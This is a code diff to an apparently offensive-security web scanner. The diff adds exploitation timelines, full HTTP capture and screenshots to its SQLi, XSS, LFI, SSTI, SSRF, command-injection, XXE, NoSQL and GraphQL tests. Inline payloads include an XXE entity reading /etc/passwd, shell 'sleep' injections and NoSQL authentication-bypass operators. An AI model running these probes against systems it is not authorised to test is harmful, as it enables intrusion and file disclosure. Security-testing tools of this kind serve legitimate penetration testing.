@@ -46,8 +46,34 @@ class Severity(Enum):
 
 
 @dataclass
+class ExploitStep:
+    """Single step in exploitation timeline"""
+    step: int
+    action: str
+    timestamp: str
+    request: Optional[str] = None
+    response_status: Optional[int] = None
+    response_preview: Optional[str] = None
+    success: bool = False
+    note: str = ""
+
+
+@dataclass
+class HttpCapture:
+    """Captured HTTP request/response"""
+    request_method: str
+    request_url: str
+    request_headers: Dict[str, str]
+    request_body: Optional[str]
+    response_status: int
+    response_headers: Dict[str, str]
+    response_body: str
+    response_time: float
+
+
+@dataclass
 class Finding:
-    """Single vulnerability finding"""
+    """Single vulnerability finding with full exploitation details"""
     id: str
     vuln_type: str
     severity: Severity
@@ -59,12 +85,57 @@ class Finding:
     poc: str
     extracted_data: Optional[Dict] = None
     timestamp: str = field(default_factory=lambda: datetime.now().isoformat())
+    # New fields for detailed output
+    timeline: List[ExploitStep] = field(default_factory=list)
+    http_captures: List[HttpCapture] = field(default_factory=list)
+    screenshot_path: Optional[str] = None
 
     def to_dict(self) -> Dict:
-        return {
-            **asdict(self),
-            "severity": self.severity.value
+        result = {
+            "id": self.id,
+            "vuln_type": self.vuln_type,
+            "severity": self.severity.value,
+            "url": self.url,
+            "parameter": self.parameter,
+            "payload": self.payload,
+            "evidence": self.evidence,
+            "description": self.description,
+            "poc": self.poc,
+            "extracted_data": self.extracted_data,
+            "timestamp": self.timestamp,
+            "screenshot_path": self.screenshot_path,
+            "timeline": [
+                {
+                    "step": s.step,
+                    "action": s.action,
+                    "timestamp": s.timestamp,
+                    "request": s.request,
+                    "response_status": s.response_status,
+                    "response_preview": s.response_preview,
+                    "success": s.success,
+                    "note": s.note
+                }
+                for s in self.timeline
+            ],
+            "http_captures": [
+                {
+                    "request": {
+                        "method": c.request_method,
+                        "url": c.request_url,
+                        "headers": c.request_headers,
+                        "body": c.request_body
+                    },
+                    "response": {
+                        "status": c.response_status,
+                        "headers": c.response_headers,
+                        "body": c.response_body[:2000] if c.response_body else None,
+                        "time": c.response_time
+                    }
+                }
+                for c in self.http_captures
+            ]
         }
+        return result
 
 
 @dataclass
@@ -115,6 +186,8 @@ class UnifiedScanner:
         self.session: Optional[aiohttp.ClientSession] = None
         self.event_callback: Optional[Callable] = None
         self.stop_requested: Dict[str, bool] = {}
+        self.screenshot_service = None
+        self.screenshots_enabled = True
 
         # Import payloads
         from app.payloads import (
@@ -153,10 +226,56 @@ class UnifiedScanner:
                 connector=aiohttp.TCPConnector(ssl=False, limit=20)
             )
 
+        # Initialize screenshot service
+        if self.screenshots_enabled and not self.screenshot_service:
+            try:
+                from app.services.screenshot import get_screenshot_service
+                self.screenshot_service = get_screenshot_service()
+                await self.screenshot_service.initialize()
+            except Exception as e:
+                logger.warning(f"Screenshot service unavailable: {e}")
+
     async def close(self):
         if self.session:
             await self.session.close()
             self.session = None
+        if self.screenshot_service:
+            await self.screenshot_service.close()
+            self.screenshot_service = None
+
+    async def _capture_screenshot(self, finding: Finding, url: str) -> Optional[str]:
+        """Capture screenshot for a finding"""
+        if not self.screenshot_service or not self.screenshots_enabled:
+            return None
+
+        # Only capture for critical and high severity
+        if finding.severity not in [Severity.CRITICAL, Severity.HIGH]:
+            return None
+
+        try:
+            screenshot_path = await self.screenshot_service.capture_with_payload(
+                url, finding.id
+            )
+            return screenshot_path
+        except Exception as e:
+            logger.warning(f"Screenshot capture failed: {e}")
+            return None
+
+    async def _add_finding(
+        self,
+        session: ScanSession,
+        finding: Finding,
+        test_url: str,
+        vuln_type: str
+    ):
+        """Add finding with screenshot capture"""
+        # Capture screenshot
+        screenshot_path = await self._capture_screenshot(finding, test_url)
+        if screenshot_path:
+            finding.screenshot_path = screenshot_path
+
+        session.findings.append(finding)
+        self._log_event(session, vuln_type, f"FOUND: {finding.url}")
 
     def _generate_id(self) -> str:
         return hashlib.md5(f"{datetime.now().isoformat()}".encode()).hexdigest()[:12]
@@ -180,9 +299,10 @@ class UnifiedScanner:
         url: str,
         headers: Dict = None,
         data: Any = None,
-        params: Dict = None
+        params: Dict = None,
+        capture: bool = False
     ) -> tuple:
-        """Make HTTP request"""
+        """Make HTTP request with optional full capture"""
         session.total_requests += 1
         default_headers = {
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
@@ -192,12 +312,32 @@ class UnifiedScanner:
             default_headers.update(headers)
 
         try:
+            import time
+            start_time = time.time()
             async with self.session.request(
                 method, url, headers=default_headers, data=data, params=params
             ) as resp:
                 text = await resp.text()
-                return text, resp.status, dict(resp.headers)
+                elapsed = time.time() - start_time
+                resp_headers = dict(resp.headers)
+
+                if capture:
+                    http_capture = HttpCapture(
+                        request_method=method,
+                        request_url=url,
+                        request_headers=default_headers,
+                        request_body=data if isinstance(data, str) else json.dumps(data) if data else None,
+                        response_status=resp.status,
+                        response_headers=resp_headers,
+                        response_body=text,
+                        response_time=elapsed
+                    )
+                    return text, resp.status, resp_headers, http_capture
+
+                return text, resp.status, resp_headers
         except Exception as e:
+            if capture:
+                return None, 0, {}, None
             return None, 0, {}
 
     # ==================== RECONNAISSANCE ====================
@@ -304,13 +444,31 @@ class UnifiedScanner:
     async def _test_sqli(self, session: ScanSession, url: str, param: str):
         """Test for SQL injection"""
         payloads = self.payloads["sqli"]["detection"][:15]
+        timeline = []
+        captures = []
+        step_num = 0
 
         for payload in payloads:
             if self.stop_requested.get(session.scan_id):
                 return
 
+            step_num += 1
             test_url = self._inject_param(url, param, payload)
-            resp, status, _ = await self._request(session, "GET", test_url)
+
+            # Create timeline step
+            step = ExploitStep(
+                step=step_num,
+                action=f"Testing SQLi payload: {payload[:50]}",
+                timestamp=datetime.now().isoformat(),
+                request=f"GET {test_url}",
+                success=False
+            )
+
+            result = await self._request(session, "GET", test_url, capture=True)
+            resp, status, _, http_capture = result if len(result) == 4 else (*result, None)
+
+            step.response_status = status
+            step.response_preview = resp[:200] if resp else None
 
             if resp:
                 errors = [
@@ -322,6 +480,12 @@ class UnifiedScanner:
 
                 for error in errors:
                     if error in resp_lower:
+                        step.success = True
+                        step.note = f"SQL error detected: {error}"
+                        timeline.append(step)
+                        if http_capture:
+                            captures.append(http_capture)
+
                         finding = Finding(
                             id=self._generate_id(),
                             vuln_type="SQL Injection",
@@ -331,26 +495,54 @@ class UnifiedScanner:
                             payload=payload,
                             evidence=f"SQL error detected: {error}",
                             description="SQL injection vulnerability allows attackers to manipulate database queries",
-                            poc=self._gen_sqli_poc(url, param, payload)
+                            poc=self._gen_sqli_poc(url, param, payload),
+                            timeline=timeline,
+                            http_captures=captures
                         )
-                        session.findings.append(finding)
-                        self._log_event(session, "sqli", f"FOUND: {url} param={param}")
+                        await self._add_finding(session, finding, test_url, "sqli")
                         return
+
+            timeline.append(step)
+            if http_capture:
+                captures.append(http_capture)
 
     async def _test_xss(self, session: ScanSession, url: str, param: str):
         """Test for XSS"""
         payloads = self.payloads["xss"]["basic"][:10]
         marker = f"xss{self._generate_id()[:6]}"
+        timeline = []
+        captures = []
+        step_num = 0
 
         for payload in payloads:
             if self.stop_requested.get(session.scan_id):
                 return
 
+            step_num += 1
             test_payload = payload.replace("alert(1)", f"alert('{marker}')")
             test_url = self._inject_param(url, param, test_payload)
-            resp, status, _ = await self._request(session, "GET", test_url)
+
+            step = ExploitStep(
+                step=step_num,
+                action=f"Testing XSS payload: {test_payload[:50]}",
+                timestamp=datetime.now().isoformat(),
+                request=f"GET {test_url}",
+                success=False
+            )
+
+            result = await self._request(session, "GET", test_url, capture=True)
+            resp, status, _, http_capture = result if len(result) == 4 else (*result, None)
+
+            step.response_status = status
+            step.response_preview = resp[:200] if resp else None
 
             if resp and (test_payload in resp or marker in resp):
+                step.success = True
+                step.note = "Payload reflected without encoding"
+                timeline.append(step)
+                if http_capture:
+                    captures.append(http_capture)
+
                 finding = Finding(
                     id=self._generate_id(),
                     vuln_type="Cross-Site Scripting (XSS)",
@@ -360,24 +552,52 @@ class UnifiedScanner:
                     payload=test_payload,
                     evidence="Payload reflected in response without encoding",
                     description="XSS allows attackers to inject malicious scripts",
-                    poc=self._gen_xss_poc(url, param, test_payload)
+                    poc=self._gen_xss_poc(url, param, test_payload),
+                    timeline=timeline,
+                    http_captures=captures
                 )
-                session.findings.append(finding)
-                self._log_event(session, "xss", f"FOUND: {url} param={param}")
+                await self._add_finding(session, finding, test_url, "xss")
                 return
+
+            timeline.append(step)
+            if http_capture:
+                captures.append(http_capture)
 
     async def _test_lfi(self, session: ScanSession, url: str, param: str):
         """Test for LFI"""
         payloads = self.payloads["lfi"]["basic"][:10]
+        timeline = []
+        captures = []
+        step_num = 0
 
         for payload in payloads:
             if self.stop_requested.get(session.scan_id):
                 return
 
+            step_num += 1
             test_url = self._inject_param(url, param, payload)
-            resp, status, _ = await self._request(session, "GET", test_url)
+
+            step = ExploitStep(
+                step=step_num,
+                action=f"Testing LFI payload: {payload[:50]}",
+                timestamp=datetime.now().isoformat(),
+                request=f"GET {test_url}",
+                success=False
+            )
+
+            result = await self._request(session, "GET", test_url, capture=True)
+            resp, status, _, http_capture = result if len(result) == 4 else (*result, None)
+
+            step.response_status = status
+            step.response_preview = resp[:200] if resp else None
 
             if resp and ("root:" in resp or "[fonts]" in resp.lower()):
+                step.success = True
+                step.note = "System file content detected"
+                timeline.append(step)
+                if http_capture:
+                    captures.append(http_capture)
+
                 finding = Finding(
                     id=self._generate_id(),
                     vuln_type="Local File Inclusion",
@@ -388,26 +608,54 @@ class UnifiedScanner:
                     evidence="System file content detected in response",
                     description="LFI allows attackers to read local files",
                     poc=self._gen_lfi_poc(url, param, payload),
-                    extracted_data={"file_content": resp[:500]}
+                    extracted_data={"file_content": resp[:500]},
+                    timeline=timeline,
+                    http_captures=captures
                 )
-                session.findings.append(finding)
-                self._log_event(session, "lfi", f"FOUND: {url} param={param}")
+                await self._add_finding(session, finding, test_url, "lfi")
                 return
+
+            timeline.append(step)
+            if http_capture:
+                captures.append(http_capture)
 
     async def _test_ssti(self, session: ScanSession, url: str, param: str):
         """Test for SSTI"""
         payloads = self.payloads["ssti"]["detection"][:8]
+        timeline = []
+        captures = []
+        step_num = 0
 
         for payload in payloads:
             if self.stop_requested.get(session.scan_id):
                 return
 
+            step_num += 1
             test_url = self._inject_param(url, param, payload)
-            resp, status, _ = await self._request(session, "GET", test_url)
+
+            step = ExploitStep(
+                step=step_num,
+                action=f"Testing SSTI payload: {payload[:50]}",
+                timestamp=datetime.now().isoformat(),
+                request=f"GET {test_url}",
+                success=False
+            )
+
+            result = await self._request(session, "GET", test_url, capture=True)
+            resp, status, _, http_capture = result if len(result) == 4 else (*result, None)
+
+            step.response_status = status
+            step.response_preview = resp[:200] if resp else None
 
             if resp:
                 # Check for template evaluation
                 if "49" in resp and "7*7" in payload:
+                    step.success = True
+                    step.note = "Template expression evaluated (7*7=49)"
+                    timeline.append(step)
+                    if http_capture:
+                        captures.append(http_capture)
+
                     finding = Finding(
                         id=self._generate_id(),
                         vuln_type="Server-Side Template Injection",
@@ -417,11 +665,16 @@ class UnifiedScanner:
                         payload=payload,
                         evidence="Template expression evaluated (7*7=49)",
                         description="SSTI can lead to remote code execution",
-                        poc=self._gen_ssti_poc(url, param, payload)
+                        poc=self._gen_ssti_poc(url, param, payload),
+                        timeline=timeline,
+                        http_captures=captures
                     )
-                    session.findings.append(finding)
-                    self._log_event(session, "ssti", f"FOUND: {url} param={param}")
+                    await self._add_finding(session, finding, test_url, "ssti")
                     return
+
+            timeline.append(step)
+            if http_capture:
+                captures.append(http_capture)
 
     async def _test_ssrf(self, session: ScanSession, url: str, param: str):
         """Test for SSRF"""
@@ -432,15 +685,38 @@ class UnifiedScanner:
             "http://[::1]",
             "http://0.0.0.0",
         ]
+        timeline = []
+        captures = []
+        step_num = 0
 
         for payload in payloads:
             if self.stop_requested.get(session.scan_id):
                 return
 
+            step_num += 1
             test_url = self._inject_param(url, param, payload)
-            resp, status, _ = await self._request(session, "GET", test_url)
+
+            step = ExploitStep(
+                step=step_num,
+                action=f"Testing SSRF payload: {payload}",
+                timestamp=datetime.now().isoformat(),
+                request=f"GET {test_url}",
+                success=False
+            )
+
+            result = await self._request(session, "GET", test_url, capture=True)
+            resp, status, _, http_capture = result if len(result) == 4 else (*result, None)
+
+            step.response_status = status
+            step.response_preview = resp[:200] if resp else None
 
             if resp and any(x in resp.lower() for x in ["localhost", "127.0.0.1", "ami-", "instance"]):
+                step.success = True
+                step.note = "Internal resource accessed"
+                timeline.append(step)
+                if http_capture:
+                    captures.append(http_capture)
+
                 finding = Finding(
                     id=self._generate_id(),
                     vuln_type="Server-Side Request Forgery",
@@ -450,26 +726,54 @@ class UnifiedScanner:
                     payload=payload,
                     evidence="Internal resource accessed",
                     description="SSRF allows accessing internal resources",
-                    poc=self._gen_ssrf_poc(url, param, payload)
+                    poc=self._gen_ssrf_poc(url, param, payload),
+                    timeline=timeline,
+                    http_captures=captures
                 )
-                session.findings.append(finding)
-                self._log_event(session, "ssrf", f"FOUND: {url} param={param}")
+                await self._add_finding(session, finding, test_url, "ssrf")
                 return
+
+            timeline.append(step)
+            if http_capture:
+                captures.append(http_capture)
 
     async def _test_rce(self, session: ScanSession, url: str, param: str):
         """Test for command injection"""
         payloads = ["; sleep 5", "| sleep 5", "|| sleep 5", "& sleep 5", "&& sleep 5"]
+        timeline = []
+        captures = []
+        step_num = 0
 
         for payload in payloads:
             if self.stop_requested.get(session.scan_id):
                 return
 
+            step_num += 1
             test_url = self._inject_param(url, param, payload)
+
+            step = ExploitStep(
+                step=step_num,
+                action=f"Testing RCE payload: {payload}",
+                timestamp=datetime.now().isoformat(),
+                request=f"GET {test_url}",
+                success=False
+            )
+
             start = asyncio.get_event_loop().time()
-            resp, status, _ = await self._request(session, "GET", test_url)
+            result = await self._request(session, "GET", test_url, capture=True)
             elapsed = asyncio.get_event_loop().time() - start
+            resp, status, _, http_capture = result if len(result) == 4 else (*result, None)
+
+            step.response_status = status
+            step.response_preview = resp[:200] if resp else None
 
             if elapsed > 4.5:  # Time-based detection
+                step.success = True
+                step.note = f"Time-based detection: {elapsed:.2f}s delay"
+                timeline.append(step)
+                if http_capture:
+                    captures.append(http_capture)
+
                 finding = Finding(
                     id=self._generate_id(),
                     vuln_type="Remote Code Execution",
@@ -479,20 +783,45 @@ class UnifiedScanner:
                     payload=payload,
                     evidence=f"Time-based detection: {elapsed:.2f}s delay",
                     description="Command injection allows executing system commands",
-                    poc=self._gen_rce_poc(url, param, payload)
+                    poc=self._gen_rce_poc(url, param, payload),
+                    timeline=timeline,
+                    http_captures=captures
                 )
-                session.findings.append(finding)
-                self._log_event(session, "rce", f"FOUND: {url} param={param}")
+                await self._add_finding(session, finding, test_url, "rce")
                 return
+
+            timeline.append(step)
+            if http_capture:
+                captures.append(http_capture)
 
     async def _test_xxe(self, session: ScanSession, url: str):
         """Test for XXE on XML endpoints"""
         xxe_payload = '''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'''
+        timeline = []
+        captures = []
+
+        step = ExploitStep(
+            step=1,
+            action="Testing XXE with external entity payload",
+            timestamp=datetime.now().isoformat(),
+            request=f"POST {url} with XML payload",
+            success=False
+        )
 
         headers = {"Content-Type": "application/xml"}
-        resp, status, _ = await self._request(session, "POST", url, headers=headers, data=xxe_payload)
+        result = await self._request(session, "POST", url, headers=headers, data=xxe_payload, capture=True)
+        resp, status, _, http_capture = result if len(result) == 4 else (*result, None)
+
+        step.response_status = status
+        step.response_preview = resp[:200] if resp else None
 
         if resp and "root:" in resp:
+            step.success = True
+            step.note = "File content extracted via XXE"
+            timeline.append(step)
+            if http_capture:
+                captures.append(http_capture)
+
             finding = Finding(
                 id=self._generate_id(),
                 vuln_type="XML External Entity Injection",
@@ -503,26 +832,53 @@ class UnifiedScanner:
                 evidence="File content extracted via XXE",
                 description="XXE allows reading local files and SSRF",
                 poc=self._gen_xxe_poc(url, xxe_payload),
-                extracted_data={"file_content": resp[:500]}
+                extracted_data={"file_content": resp[:500]},
+                timeline=timeline,
+                http_captures=captures
             )
-            session.findings.append(finding)
-            self._log_event(session, "xxe", f"FOUND: {url}")
+            await self._add_finding(session, finding, url, "xxe")
+        else:
+            timeline.append(step)
+            if http_capture:
+                captures.append(http_capture)
 
     async def _test_nosql(self, session: ScanSession, url: str, param: str):
         """Test for NoSQL injection"""
         payloads = ['{"$ne": ""}', '{"$gt": ""}', '{"$regex": ".*"}']
+        timeline = []
+        captures = []
+        step_num = 0
 
         for payload in payloads:
             if self.stop_requested.get(session.scan_id):
                 return
 
-            # Test as JSON body
+            step_num += 1
             headers = {"Content-Type": "application/json"}
             body = f'{{"{param}": {payload}}}'
-            resp, status, _ = await self._request(session, "POST", url, headers=headers, data=body)
+
+            step = ExploitStep(
+                step=step_num,
+                action=f"Testing NoSQL payload: {payload}",
+                timestamp=datetime.now().isoformat(),
+                request=f"POST {url} with body: {body}",
+                success=False
+            )
+
+            result = await self._request(session, "POST", url, headers=headers, data=body, capture=True)
+            resp, status, _, http_capture = result if len(result) == 4 else (*result, None)
+
+            step.response_status = status
+            step.response_preview = resp[:200] if resp else None
 
             if resp and status == 200:
                 if any(x in resp.lower() for x in ["welcome", "dashboard", "logout", "success"]):
+                    step.success = True
+                    step.note = "Authentication bypass detected"
+                    timeline.append(step)
+                    if http_capture:
+                        captures.append(http_capture)
+
                     finding = Finding(
                         id=self._generate_id(),
                         vuln_type="NoSQL Injection",
@@ -532,19 +888,45 @@ class UnifiedScanner:
                         payload=payload,
                         evidence="Authentication bypass detected",
                         description="NoSQL injection allows bypassing authentication",
-                        poc=self._gen_nosql_poc(url, param, payload)
+                        poc=self._gen_nosql_poc(url, param, payload),
+                        timeline=timeline,
+                        http_captures=captures
                     )
-                    session.findings.append(finding)
-                    self._log_event(session, "nosql", f"FOUND: {url} param={param}")
+                    await self._add_finding(session, finding, url, "nosql")
                     return
+
+            timeline.append(step)
+            if http_capture:
+                captures.append(http_capture)
 
     async def _test_graphql(self, session: ScanSession, url: str):
         """Test GraphQL endpoint"""
         introspection = '{"query": "{ __schema { types { name } } }"}'
+        timeline = []
+        captures = []
+
+        step = ExploitStep(
+            step=1,
+            action="Testing GraphQL introspection query",
+            timestamp=datetime.now().isoformat(),
+            request=f"POST {url} with introspection query",
+            success=False
+        )
+
         headers = {"Content-Type": "application/json"}
-        resp, status, _ = await self._request(session, "POST", url, headers=headers, data=introspection)
+        result = await self._request(session, "POST", url, headers=headers, data=introspection, capture=True)
+        resp, status, _, http_capture = result if len(result) == 4 else (*result, None)
+
+        step.response_status = status
+        step.response_preview = resp[:200] if resp else None
 
         if resp and "__schema" in resp:
+            step.success = True
+            step.note = "Full schema exposed via introspection"
+            timeline.append(step)
+            if http_capture:
+                captures.append(http_capture)
+
             finding = Finding(
                 id=self._generate_id(),
                 vuln_type="GraphQL Introspection Enabled",
@@ -554,10 +936,15 @@ class UnifiedScanner:
                 payload=introspection,
                 evidence="Full schema exposed via introspection",
                 description="GraphQL introspection reveals API structure",
-                poc=self._gen_graphql_poc(url, introspection)
+                poc=self._gen_graphql_poc(url, introspection),
+                timeline=timeline,
+                http_captures=captures
             )
-            session.findings.append(finding)
-            self._log_event(session, "graphql", f"FOUND: introspection enabled at {url}")
+            await self._add_finding(session, finding, url, "graphql")
+        else:
+            timeline.append(step)
+            if http_capture:
+                captures.append(http_capture)
 
     # ==================== MAIN SCAN ====================
 
